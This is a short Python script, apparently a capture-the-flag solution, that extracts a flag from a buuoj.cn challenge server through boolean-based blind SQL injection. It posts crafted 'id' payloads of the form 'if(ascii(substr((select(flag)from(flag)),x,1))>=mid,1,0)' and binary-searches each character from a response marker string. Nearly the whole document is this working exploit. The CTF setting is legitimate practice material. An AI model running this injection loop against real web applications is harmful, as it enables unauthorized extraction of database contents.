import requests
import time

url = "http://770de8b3-1ffd-4212-b213-94cd3a80304c.node4.buuoj.cn:81/"
flag = ''

for x in range(1,43):
    left = 33
    right = 126
    while(right > left):
        mid = int((left + right + 1) / 2)
        data = {'id':f"if(ascii(substr((select(flag)from(flag)),{x},1))>={mid},1,0)"}
        r = requests.post(url,data=data)
        if('Hello, glzjin wants a girlfriend.' in r.text):
            left = mid
        else:
            right = mid - 1
        time.sleep(0.1)
    flag += chr(right)
    print(flag)
